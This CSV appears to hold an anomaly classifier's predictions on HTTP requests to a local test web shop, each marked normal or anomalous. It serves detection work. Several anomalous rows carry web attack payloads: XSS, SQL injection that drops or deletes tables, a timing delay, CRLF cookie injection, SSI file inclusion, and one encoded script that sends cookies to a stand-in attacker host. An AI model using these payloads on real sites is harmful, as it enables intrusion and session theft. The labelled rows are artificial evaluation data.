Predicted,Actual,Confidence,Method,Content,URL
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1,Anomalous,96.99%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=1136&B1=Pasar+por+caja HTTP/1.1
0,Normal,98.40%,POST,id=2,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Anomalous,89.65%,POST,modo=entrar&login=cheng&pwd=cazc%2Calear&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
1,Anomalous,98.79%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9043&B1=Pasar+por+caja%2F HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1,Anomalous,94.60%,POST,modo=registro&login=mitsuiparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&password=d2S3O1nil2ar&nombre=Tea&apellidos=Cabrera+Noguera&email=holzer-hammersley4%40discon.in&dni=21034297S&direccion=Guadamacil%2C+198%2C+&ciudad=Torrejoncillo&cp=08779&provincia=Teruel&ntc=4706372444418662&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1,Anomalous,82.36%,POST,modo=registro&login=perrotta4&password=-fortificaci%F3n&nombreA=Temistocles&apellidos=Bastidas+Lacruz&email=butch%407horas.coop&dni=64652659G&direccion=Calle+Cristo+86%2C+2G&ciudad=Berrocalejo+de+Aragona&cp=10520&provincia=Girona&ntc=8239878600110127&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,90.25%,POST,modo=registro&login=raab&password=ac6%EDdi9o&nombre=Thal%EDa&apellidos=Albornoz+Quiva&email=heldabrand5%40chevrolet-volt.bg&dni=11738063J&direccion=C%2F+Otumba%2C+132%2C+&ciudad=Carataunas&cp=43791&provincia=Cuenca&ntc=8400067402160298&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1,Anomalous,98.16%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=libbey&pwd=141c1U01&remember=on&B1A=Entrar HTTP/1.1
1,Anomalous,98.47%,POST,modo=entrar&login=raymund&pwd=pist%F3n&remember=on&B1=%253F,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,98.67%,GET,,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1,Anomalous,98.61%,GET,,http://localhost:8080/tienda1/6909030637832563290.jsp.Old HTTP/1.1
1,Anomalous,99.48%,POST,id=3%2F&nombre=Vino+Rioja&precio=39&cantidad=90&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1,Anomalous,99.23%,POST,errorMsgA=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,99.33%,POST,idA=1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,84.91%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hocutt&password=MonTE9A&nombre=Sibila&apellidos=Garcez+Iturriria&email=neugebauer%40buscamoto.gw&dni=37246742J&direccion=Galeno+106%2C+9%3FC&ciudad=Ciadoncha&cp=17744&provincia=Segovia&ntc=8444341614355746&B1=Registrar HTTP/1.1
1,Anomalous,99.77%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&precio=7931&B1=Confirmar HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/asf-logo-wide.gif HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
0,Normal,89.78%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=28&B1=A%F1adir+al+carrito HTTP/1.1
1,Anomalous,99.80%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%7C HTTP/1.1
1,Anomalous,99.81%,POST,errorMsg=%2500,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,80.34%,POST,modo=registro&login=ca%2Bri%2Bta&password=import%21ador&nombre=Leinad&apellidos=Alabart&email=koyama%40civicosdns.jp&dni=19113499Q&direccion=C%2F+Silvinita+95%2C+11D&ciudad=Cordobilla+de+L%E1cara&cp=16800&provincia=Cuenca&ntc=9775185207171671&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
1,Anomalous,99.03%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/asf-logo-wide.gif/.OLD HTTP/1.1
1,Anomalous,82.51%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=derosenr&password=abarracar&nombre=Trist%E1n&apellidos=Pol+Lazcano&email=braverman-watkin%40docerosas.pl&dni=28010640K&direccionA=C%2F+Antoni+Rosello+i+Nadal+172+&ciudad=Blancafort&cp=50522&provincia=Burgos&ntc=7871877495462595&B1=Registrar HTTP/1.1
1,Anomalous,98.86%,POST,B2A=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
0,Normal,98.96%,GET,,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
1,Anomalous,99.02%,POST,modo=insertar&precio=5075&B1=Confirmar%2F,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
1,Anomalous,95.49%,POST,modo=entrar&loginA=maijala&pwd=indiv%21idualmente&remember=on&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1,Anomalous,86.04%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=iwona&pwd=pantorrilluda&rememberA=off&B1=Entrar HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/asf-logo-wide.inc HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1,Anomalous,97.55%,POST,modo=entrar&login=kuchinsk&pwd=rogadora&remember=off&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1,Anomalous,98.04%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Ques%2Bo+Manchego&precio=85&cantidad=91&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0,Normal,99.23%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
1,Anomalous,94.68%,GET,,http://localhost:8080/tienda1/.INC HTTP/1.1
0,Anomalous,73.14%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=youngman&password=a018699t0do&nombre=Ibar&apellidos=Linga%2Fn&email=damboise%40automovilesalhambra.co&dni=44906096E&direccion=Calle+Lima%2C+50+9-D&ciudad=Catadau&cp=42066&provincia=Madrid&ntc=0908077134973737&B1=Registrar HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1,Anomalous,95.16%,POST,modo=registro&login=charla&password=hi09otismo&nombre=Zita&apellidos=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&email=robb-ghostley%40botilleria.com.sb&dni=09531645P&direccion=Calle+Dresde+25+6%3FD&ciudad=Molezuelas+de+la+Carballeda&cp=08281&provincia=Baleares+%28Illes%29&ntc=7133217385805670&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,98.86%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
0,Normal,98.66%,GET,,http://localhost:8080/tienda1/index.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
1,Anomalous,97.87%,POST,modo=insertar&precioA=9248&B1=Confirmar,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,98.44%,GET,,http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
1,Normal,82.94%,POST,modo=insertar&precio=0&B1=Confirmar,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0,Normal,98.66%,GET,,http://localhost:8080/tienda1/index.jsp HTTP/1.1
1,Anomalous,98.46%,GET,,http://localhost:8080/tienda1/global/titulo.jsp/6909030637832563290.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1,Anomalous,99.55%,PUT,id=2,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/estore/populate HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
1,Anomalous,99.16%,POST,modo=registro&login=raglin&password=m783a1er3&nombre=Careli&apellidos=Navines&email=leclerc6%40soycastellano.gl&dni=52316705P%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&direccion=C%2F+Tavernes+Blanques%2C+S%2FN+&ciudad=Rupi%E0&cp=21610&provincia=Guip%FAzcoa&ntc=8201185179055303&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
1,Anomalous,98.34%,POST,modoA=insertar&precio=7224&B1=Pasar+por+caja,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,99.85%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=radomir8&password=potajera&nombre=Aim%E9&apellidos=Fadul+Lude%F1as&email=houseman%40sitienesunawebtienesunnegocio.io&dni=97675447J&direccion=Pla%E7a+Gramatics%2C+3%2C+&ciudad=Valverde+del+Camino&cp=10133any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&provincia=%C1vila&ntc=7141808491932190&B1=Registrar HTTP/1.1
0,Normal,90.00%,POST,id=1&nombre=Vino+Rioja&precio=85&cantidad=8&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1,Anomalous,97.21%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=idealismo&nombre=Ian&apellidos=Sacota+Xech&email=alland.soeltoft%40aridossanchez.do&dni=28681618C&direccion=C%2F+Valencia+S%2FN+11A&ciudad=Pancorbo&cp=26321&provincia=Alicante&ntc=3366384544522158&B1=Registrar HTTP/1.1
1,Anomalous,94.92%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=knobloch6&password=B5i230a&nombre=Nahuel&apellidos=Arbona+Yaz%E1n&email=bruck7%40introito.cg&dni=85294407B&direccion=Pl.+La+Se%F1oria%2C+192+12E&ciudad=Valverde+del+Camino&cp=33746&provincia=Lleida&ntcA=7752606383220025&B1=Registrar HTTP/1.1
1,Anomalous,98.16%,POST,modo=entrar&login=rybczyns&pwd=2a530na9&remember=on&B1A=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1,Anomalous,51.81%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ramnarin&password=o14ula2o&nombre=Fedelia&apellidos=Badia+M%F3nico&email=lenoir0%40ofertachina.fj&dni=34742926T&direccion=C%2F+Felipe+Oya+Rodriguez+56+12F&ciudad=Navalilla&cp=07048&provincia=%3FT%2Beruel&ntc=2677666876528376&B1=Registrar HTTP/1.1
0,Normal,94.88%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=39&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
0,Normal,89.65%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=aylmar6&pwd=ringle_ra&remember=on&B1=Entrar HTTP/1.1
1,Anomalous,97.19%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=judas&pwd=ZaRrAm%24pl%EDN&remember=on&B1=Entrar HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
0,Normal,98.73%,POST,modo=insertar&precio=7656&B1=Confirmar,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0,Normal,98.67%,GET,,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
1,Anomalous,99.42%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27INJECTED_PARAM HTTP/1.1
1,Anomalous,97.87%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=5434&B1=Confirmar HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1,Anomalous,98.86%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
0,Normal,83.10%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=devy&password=aJaRACa&nombre=Ermelindo&apellidos=Almirall+Pahisa&email=leza.vanbrugh%40ajuntamentbarcelona2-0.gq&dni=61089913G&direccion=Alvarez+35+&ciudad=Corull%F3n&cp=42250&provincia=Valencia&ntc=4870628613160341&B1=Registrar HTTP/1.1
0,Normal,98.67%,GET,,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
0,Normal,98.86%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
1,Normal,52.04%,POST,modo=entrar&login=svenn-er&pwd=l6c971c1a&remember=on&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1,Anomalous,59.38%,POST,modo=registro&login=mitsui&password=d2S3O1nil2ar&nombre=Tea&apellidos=Cabrera+Noguera&email=holzer-hammersley4%40discon.in&dni=21034297S&direccion=Guadamacil%2C+198%2C+&ciudad=Torrejoncillo&cpA=08779&provincia=Teruel&ntc=4706372444418662&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.86%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1
1,Anomalous,99.46%,POST,id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1,Anomalous,99.99%,POST,errorMsg=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0,Normal,99.23%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
1,Anomalous,97.68%,POST,modo=entrar&login=robbert&pwd=5rgullecer&remember=off%2F&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1,Anomalous,95.81%,POST,modo=registro&login=moyce&password=antepuesto&nombre=Alberde&apellidos=Fidalgo&email=pochon%40thw-adm.zm&dni=52825918R&direccion=Pico+Clavero+S%2FN%2C+&ciudad=San+Silvestre+de+Guzm%E1n&cp=09390&provinciaA=Alicante&ntc=6031155114009786&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,96.70%,POST,modo=registro%27+DELETE+FROM+USERS&login=messier&password=c7b183o&nombre=Nicodemo&apellidos=Triola+Villuend&email=galloway%40rtce.gu&dni=35507822P&direccion=Numero+15%2C+151%2C+&ciudad=Castrillo+de+la+Guare%F1a&cp=23657&provincia=Toledo&ntc=1278501676319264&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,96.91%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=sienggo&password=6121cu5g%E9*7449&nombre=Jer%F3nimo&apellidos=Carretto+Morgadas&email=magelis.kember%40cirujanaplastica.nc&dni=22646510C&direccion=Plaza+San+Jorge%2C+S%2FN%2C+2%3FH&ciudad=Mariana&cp=15807&provincia=Palencia&ntc=2175163155221209&B1=Registrar HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
1,Anomalous,78.65%,GET,,http://localhost:8080/tienda1/publico/6909030637832563290.jsp HTTP/1.1
0,Normal,89.65%,POST,modo=entrar&login=kin-yee&pwd=99r5nA&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1,Anomalous,98.39%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp/asf-logo-wide.gif/ HTTP/1.1
0,Normal,86.26%,POST,modo=registro&login=tehchi8&password=descerrajado&nombre=Gino&apellidos=Flor%ED+Chino&email=blakley%40asyra.ao&dni=61621455Q&direccion=Primavera%2C+174+&ciudad=Portomar%EDn&cp=24730&provincia=Badajoz&ntc=5655366857246860&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1,Anomalous,99.33%,POST,idA=2,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1,Anomalous,98.86%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
1,Anomalous,94.60%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mitsuiparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&password=d2S3O1nil2ar&nombre=Tea&apellidos=Cabrera+Noguera&email=holzer-hammersley4%40discon.in&dni=21034297S&direccion=Guadamacil%2C+198%2C+&ciudad=Torrejoncillo&cp=08779&provincia=Teruel&ntc=4706372444418662&B1=Registrar HTTP/1.1
1,Anomalous,99.24%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
1,Anomalous,98.27%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lyliston&pwd=de4454&remember=off&B1A=Entrar HTTP/1.1
0,Normal,89.78%,POST,id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=91&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1,Anomalous,98.90%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp/6909030637832563290.jsp.java HTTP/1.1
0,Normal,89.65%,POST,modo=entrar&login=sikes&pwd=tirAMoLlar&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,84.91%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pardip&password=hacanea&nombre=Xanto&apellidos=Tuset+Mendel&email=velov%40expozaragozafloral2014.ac&dni=46630334L&direccion=Calle+Maldonadas%2C+S%2FN+4H&ciudad=Villamuelas&cp=19325&provincia=Ciudad+Real&ntc=3278824156845897&B1=Registrar HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1,Anomalous,99.87%,POST,B2=Vaciar+carritoany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
0,Normal,98.40%,POST,id=2,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
1,Anomalous,96.99%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=6471&B1=Pasar+por+caja HTTP/1.1
